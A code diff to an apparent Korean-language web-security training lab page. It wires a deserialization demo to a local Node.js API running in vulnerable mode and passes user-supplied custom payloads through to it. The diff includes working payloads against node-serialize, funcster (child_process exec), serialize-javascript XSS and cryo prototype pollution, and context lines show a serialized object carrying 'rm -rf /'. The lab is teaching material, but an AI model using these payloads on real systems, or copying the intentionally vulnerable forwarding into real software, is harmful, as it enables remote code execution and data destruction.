@@ -380,12 +380,22 @@ class AdvancedDeserializationTest {
         return $result;
     }
     
-    public function simulateNodeJsDeserialization($payload_type) {
+    public function simulateNodeJsDeserialization($payload_type, $custom_payload = '') {
         $result = '';
         
         try {
             $result .= "<div class='vulnerable-output'>";
-            $result .= "<h4>🟢 Node.js 직렬화 취약점 시뮬레이션</h4>";
+            $result .= "<h4>🟢 Node.js 직렬화 취약점 - 실제 API 테스트</h4>";
+            
+            // 실제 Node.js API 호출 시도
+            $api_result = $this->callNodeJsAPI($payload_type, $custom_payload);
+            
+            if ($api_result) {
+                $result .= "<div style='background: #1a1a1a; color: #00ff00; padding: 15px; border-radius: 5px; margin: 10px 0;'>";
+                $result .= "<h5>🚀 실제 API 응답:</h5>";
+                $result .= "<pre>" . htmlspecialchars(json_encode($api_result, JSON_PRETTY_PRINT)) . "</pre>";
+                $result .= "</div>";
+            }
             
             $nodejs_attacks = [
                 'node_serialize' => [
@@ -451,13 +461,13 @@ class AdvancedDeserializationTest {
                         $result .= "const serialize = require('serialize-javascript');\n\n";
                         $result .= "// XSS 페이로드\n";
                         $result .= "const xssPayload = {\n";
-                        $result .= "  name: '</script><script>alert(\"XSS\")</script>',\n";
+                        $result .= "  name: '" . htmlspecialchars('</script><script>alert("XSS")</script>') . "',\n";
                         $result .= "  data: 'normal data'\n";
                         $result .= "};\n\n";
                         $result .= "// 직렬화 (클라이언트로 전송)\n";
                         $result .= "const serialized = serialize(xssPayload);\n";
                         $result .= 'res.send(`<script>var data = ${serialized};</script>`);\n\n';
-                        $result .= "// 🚨 브라우저에서 스크립트 실행됨";
+                        $result .= "// 🚨 브라우저에서 스크립트 실행됨 (XSS 발생)";
                         break;
                         
                     case 'funcster':
@@ -559,6 +569,111 @@ class AdvancedDeserializationTest {
         }
         
         return $result;
+    }
+    
+    private function callNodeJsAPI($payload_type, $custom_payload = '') {
+        $api_url = 'http://localhost:3001/api/';
+        $timeout = 10; // 10초 타임아웃
+        
+        try {
+            $endpoint = '';
+            $post_data = [];
+            
+            switch ($payload_type) {
+                case 'node_serialize':
+                    $endpoint = 'node-serialize';
+                    $payload = $custom_payload ?: '{"rce":"_$$ND_FUNC$$_function(){require(\'child_process\').exec(\'calc.exe\', function(error, stdout, stderr) { console.log(stdout) });}()"}';
+                    $post_data = [
+                        'payload' => $payload,
+                        'mode' => 'vulnerable'
+                    ];
+                    break;
+                    
+                case 'serialize_javascript':
+                    $endpoint = 'serialize-javascript';
+                    $data = $custom_payload ? json_decode($custom_payload, true) : [
+                        'name' => htmlspecialchars('</script><script>alert("XSS from WebSec-Lab")</script>'),
+                        'data' => 'malicious content'
+                    ];
+                    $post_data = [
+                        'data' => $data,
+                        'mode' => 'vulnerable'
+                    ];
+                    break;
+                    
+                case 'funcster':
+                    $endpoint = 'funcster';
+                    $serialized_func = $custom_payload ?: 'function() { require("child_process").exec("whoami"); }';
+                    $post_data = [
+                        'serializedFunction' => $serialized_func,
+                        'mode' => 'vulnerable'
+                    ];
+                    break;
+                    
+                case 'cryo':
+                    $endpoint = 'cryo';
+                    $frozen_data = $custom_payload ?: '{"__proto__":{"polluted":"yes","isAdmin":true,"compromised":"WebSec-Lab"},"normalData":"hello"}';
+                    $post_data = [
+                        'frozenData' => $frozen_data,
+                        'mode' => 'vulnerable'
+                    ];
+                    break;
+                    
+                default:
+                    return ['error' => 'Unknown payload type'];
+            }
+            
+            // cURL 요청
+            $ch = curl_init();
+            curl_setopt_array($ch, [
+                CURLOPT_URL => $api_url . $endpoint,
+                CURLOPT_POST => true,
+                CURLOPT_POSTFIELDS => json_encode($post_data),
+                CURLOPT_RETURNTRANSFER => true,
+                CURLOPT_TIMEOUT => $timeout,
+                CURLOPT_HTTPHEADER => [
+                    'Content-Type: application/json',
+                    'User-Agent: WebSec-Lab-PHP-Client/1.0'
+                ],
+                CURLOPT_SSL_VERIFYPEER => false,
+                CURLOPT_FOLLOWLOCATION => true
+            ]);
+            
+            $response = curl_exec($ch);
+            $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+            $curl_error = curl_error($ch);
+            curl_close($ch);
+            
+            if ($curl_error) {
+                return [
+                    'error' => 'API 연결 실패: ' . $curl_error,
+                    'suggestion' => 'Node.js API 서버가 실행 중인지 확인하세요 (포트 3001)'
+                ];
+            }
+            
+            if ($http_code !== 200) {
+                return [
+                    'error' => 'API 응답 오류',
+                    'http_code' => $http_code,
+                    'response' => $response
+                ];
+            }
+            
+            $result = json_decode($response, true);
+            if (json_last_error() !== JSON_ERROR_NONE) {
+                return [
+                    'error' => 'JSON 파싱 실패',
+                    'raw_response' => $response
+                ];
+            }
+            
+            return $result;
+            
+        } catch (Exception $e) {
+            return [
+                'error' => 'API 호출 중 예외 발생: ' . $e->getMessage()
+            ];
+        }
     }
     
     public function generateMaliciousPayload($type, $command = '') {
@@ -790,7 +905,8 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
             
         case 'nodejs_deserialize':
             $payload_type = $_POST['nodejs_type'] ?? 'node_serialize';
-            $result = $deserializationTest->simulateNodeJsDeserialization($payload_type);
+            $custom_payload = $_POST['nodejs_payload'] ?? '';
+            $result = $deserializationTest->simulateNodeJsDeserialization($payload_type, $custom_payload);
             break;
             
         case 'generate_payload':
@@ -1114,23 +1230,54 @@ O:11:"SystemShell":2:{s:3:"cmd";s:8:"rm -rf /";s:6:"target";s:4:"root";}
 
             <!-- Node.js Deserialization -->
             <div class="test-section">
-                <h3>🟢 Node.js 직렬화 취약점</h3>
-                <p>Node.js의 다양한 직렬화 라이브러리 취약점을 시뮬레이션합니다.</p>
+                <h3>🟢 Node.js 직렬화 취약점 - 실제 API 연동</h3>
+                <p><strong>실제 Node.js API와 연동하여</strong> 다양한 직렬화 라이브러리 취약점을 테스트합니다.</p>
+                
+                <div class="info-output" style="margin-bottom: 15px;">
+                    <p><strong>🚀 실시간 API 테스트:</strong> Node.js 서버가 실행 중이면 실제 공격 구문이 처리됩니다!</p>
+                    <p><strong>🎯 API 서버 시작:</strong> <code>cd node_api && npm install && npm start</code></p>
+                </div>
                 
                 <form method="post">
                     <div class="form-group">
                         <label for="nodejs_type">취약점 유형 선택:</label>
-                        <select name="nodejs_type" id="nodejs_type">
-                            <option value="node_serialize">node-serialize 취약점</option>
+                        <select name="nodejs_type" id="nodejs_type" onchange="updateNodeJsPayloadExample()">
+                            <option value="node_serialize">node-serialize 취약점 (RCE)</option>
                             <option value="serialize_javascript">serialize-javascript XSS</option>
                             <option value="funcster">funcster RCE</option>
                             <option value="cryo">cryo 프로토타입 오염</option>
                         </select>
                     </div>
                     
+                    <div class="form-group">
+                        <label for="nodejs_payload">커스텀 페이로드 (선택사항):</label>
+                        <textarea name="nodejs_payload" id="nodejs_payload" placeholder="기본 페이로드를 사용하려면 비워두세요. 커스텀 페이로드를 테스트하려면 여기에 입력하세요." style="height: 120px;"><?php echo htmlspecialchars($_POST['nodejs_payload'] ?? ''); ?></textarea>
+                        <small style="color: #666;">💡 팁: 비워두면 해당 취약점에 맞는 기본 공격 페이로드가 사용됩니다.</small>
+                    </div>
+                    
                     <input type="hidden" name="action" value="nodejs_deserialize">
-                    <button type="submit" class="dangerous-btn">🟢 Node.js 공격 시뮬레이션</button>
+                    <button type="submit" class="dangerous-btn">🚀 실제 Node.js API 공격 테스트</button>
                 </form>
+                
+                <!-- 페이로드 예제 -->
+                <div style="margin-top: 20px;">
+                    <h5>⚡ 페이로드 예제들:</h5>
+                    <div id="nodejs-payload-examples">
+                        <div class="payload-examples">
+node-serialize RCE:
+{"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('calc.exe');}()"}
+
+serialize-javascript XSS:
+{"name":"&lt;/script&gt;&lt;script&gt;alert('XSS')&lt;/script&gt;","data":"malicious"}
+
+funcster RCE:
+function() { require("child_process").exec("whoami"); }
+
+cryo Prototype Pollution:
+{"__proto__":{"polluted":"yes","isAdmin":true},"normalData":"hello"}
+                        </div>
+                    </div>
+                </div>
             </div>
         </div>
 
@@ -1212,6 +1359,23 @@ O:11:"SystemShell":2:{s:3:"cmd";s:8:"rm -rf /";s:6:"target";s:4:"root";}
     </div>
 
     <script>
+        // Node.js 페이로드 예제 업데이트
+        function updateNodeJsPayloadExample() {
+            const select = document.getElementById('nodejs_type');
+            const textarea = document.getElementById('nodejs_payload');
+            const examples = {
+                'node_serialize': '{"rce":"_$$ND_FUNC$$_function(){require(\'child_process\').exec(\'calc.exe\');}()"}',
+                'serialize_javascript': '{"name":"[XSS Script Tag]","data":"malicious content"}',
+                'funcster': 'function() { require("child_process").exec("whoami"); }',
+                'cryo': '{"__proto__":{"polluted":"yes","isAdmin":true,"compromised":"WebSec-Lab"},"normalData":"hello"}'
+            };
+            
+            // placeholder 업데이트
+            if (examples[select.value]) {
+                textarea.placeholder = '예제 페이로드:\n' + examples[select.value];
+            }
+        }
+        
         // 페이로드 예제 자동 채우기
         function fillExamplePayload(type) {
             const textarea = document.getElementById('serialized_data');
